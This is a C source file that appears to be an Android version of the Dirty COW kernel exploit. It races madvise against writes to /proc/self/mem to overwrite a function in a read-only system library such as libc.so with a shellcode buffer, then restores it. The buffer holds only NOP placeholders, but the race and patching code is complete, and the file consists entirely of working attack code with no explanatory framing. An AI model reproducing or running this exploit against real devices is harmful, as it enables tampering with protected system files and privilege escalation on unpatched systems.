#include <err.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/types.h>

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#else
#define LOGV(...) 
#endif

unsigned char shellcode_buf[256] = { 0x90, 0x90, 0x90, 0x90 };

#define SHELLCODE shellcode_buf
#define LOOP		0x100000
#define CHECK		0x100

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

struct mem_arg  {
	off_t offset;
	unsigned char *patch;
	unsigned char *unpatch;
	size_t patch_size;
	int do_patch;

	void *map;
};

static int check(struct mem_arg *mem_arg, const char *thread_name)
{
	unsigned char *check_patch = mem_arg->do_patch ? mem_arg->patch : mem_arg->unpatch;
	if (*(unsigned char*)mem_arg->offset == *check_patch &&
			*((unsigned char*)mem_arg->offset + mem_arg->patch_size) == *(check_patch + mem_arg->patch_size)) {
		return 1;
	}
	return 0;
}

static void *madviseThread(void *arg)
{
	struct mem_arg *mem_arg;
	size_t size;
	void *addr;
	int i, c = 0;

	mem_arg = (struct mem_arg *)arg;
	addr = (void *)(mem_arg->offset & (~(PAGE_SIZE - 1)));
	/*size = mem_arg->offset - (unsigned long)addr;*/
	size = mem_arg->patch_size + (mem_arg->offset - (unsigned long)addr);
	LOGV("[*] madvise = %p %d", addr, size);

	for(i = 0; i < LOOP; i++) {
		c += madvise(addr, size, MADV_DONTNEED);
		if (i % CHECK == 0 && check(mem_arg, __func__))
			break;
	}

	LOGV("[*] madvise = %d", c);
	return 0;
}

static void *procselfmemThread(void *arg)
{
	struct mem_arg *mem_arg;
	int fd, i, c = 0;
	unsigned char *p;

	mem_arg = (struct mem_arg *)arg;
	p = mem_arg->do_patch ? mem_arg->patch : mem_arg->unpatch;

	fd = open("/proc/self/mem", O_RDWR);
	if (fd == -1)
		LOGV("open(\"/proc/self/mem\"");

	/*void *newp = malloc(mem_arg->patch_size);*/
	/*lseek(fd, mem_arg->offset, SEEK_SET);*/
	/*read(fd, newp, mem_arg->patch_size);*/
	/*hexdump(newp, 16);*/

	for (i = 0; i < LOOP; i++) {
		lseek(fd, mem_arg->offset, SEEK_SET);
		c += write(fd, p, mem_arg->patch_size);

		if (i % CHECK == 0 && check(mem_arg, __func__))
			break;
	}

	LOGV("[*] /proc/self/mem %d", c);

	close(fd);

	return NULL;
}

static int get_range(const char * library, unsigned long *start, unsigned long *end)
{
	char line[4096];
	FILE *fp;

	fp = fopen("/proc/self/maps", "r");
	if (fp == NULL)
		LOGV("fopen(\"/proc/self/maps\")");

	while (fgets(line, sizeof(line), fp) != NULL) {
		if (strstr(line, library) == NULL)
			continue;

		if (strstr(line, "r-xp") == NULL)
			continue;

		*start = strtoul(line, NULL, 16);
		*end = strtoul(line+9, NULL, 16);
		fclose(fp);
		return 0;
	}

	fclose(fp);

	return -1;
}

static void exploit(struct mem_arg *mem_arg, int do_patch)
{
	pthread_t pth1, pth2;

	LOGV("[*] exploit (%s)", do_patch ? "patch": "unpatch");
	LOGV("[*] currently %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);

	mem_arg->do_patch = do_patch;

	pthread_create(&pth1, NULL, madviseThread, mem_arg);
	pthread_create(&pth2, NULL, procselfmemThread, mem_arg);

	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);

	LOGV("[*] exploited %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);
}

static unsigned long get_function_addr(const char * libname, const char * symbol)
{
	unsigned long addr;
	void *handle;
	const char *error;

	dlerror();

	handle = dlopen(libname, RTLD_LAZY);
	if (handle == NULL) {
		LOGV("%s", dlerror());
		exit(EXIT_FAILURE);
	}

	addr = (unsigned long)dlsym(handle, symbol);
	error = dlerror();
	if (error != NULL) {
		LOGV("%s", error);
		exit(EXIT_FAILURE);
	}

	dlclose(handle);

	return addr;
}

int main(int argc, char *argv[])
{
	if (argc < 2) {
		LOGV("usage %s /system/lib/libc.so capget", argv[0]);
		return 0;
	}

	const char* library = argv[1];
	const char* function = argv[2];
	const char* libname = strrchr(library, '/');
	if (libname == 0) {
		libname = library;
	} else {
		libname++;
	}

	unsigned long start, end;
	unsigned long function_addr;
	struct mem_arg mem_arg;
	struct stat st;
	pid_t pid;
	int fd;

	LOGV("[*] function: %s library: %s libname: %s", function, library, libname);

	function_addr = get_function_addr(libname, function);

	LOGV("[*] %s addr: %lx", function, function_addr);

	int range = get_range(library, &start, &end);
	if (range != 0) {
		LOGV("failed to get range");
	}

	LOGV("[*] %s range: %lx-%lx", libname, start, end);

	mem_arg.patch = malloc(sizeof(SHELLCODE)-1);
	if (mem_arg.patch == NULL)
		LOGV("malloc");

	mem_arg.unpatch = malloc(sizeof(SHELLCODE)-1);
	if (mem_arg.unpatch == NULL)
		LOGV("malloc");

	memcpy(mem_arg.unpatch, (void *)function_addr, sizeof(SHELLCODE)-1);
	memcpy(mem_arg.patch, SHELLCODE, sizeof(SHELLCODE)-1);
	mem_arg.patch_size = sizeof(SHELLCODE)-1;
	mem_arg.do_patch = 1;

	fd = open(library, O_RDONLY);
	if (fd == -1)
		LOGV("open(\" %s \")", library);
	if (fstat(fd, &st) == -1)
		LOGV("fstat");

	mem_arg.map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	if (mem_arg.map == MAP_FAILED)
		LOGV("mmap");
	close(fd);

	LOGV("[*] mmap %p", mem_arg.map);

	mem_arg.offset = (off_t)((unsigned long)mem_arg.map + function_addr - start);

	exploit(&mem_arg, 1);
	exploit(&mem_arg, 0);

	LOGV("function has been unpatched");
	return 0;
}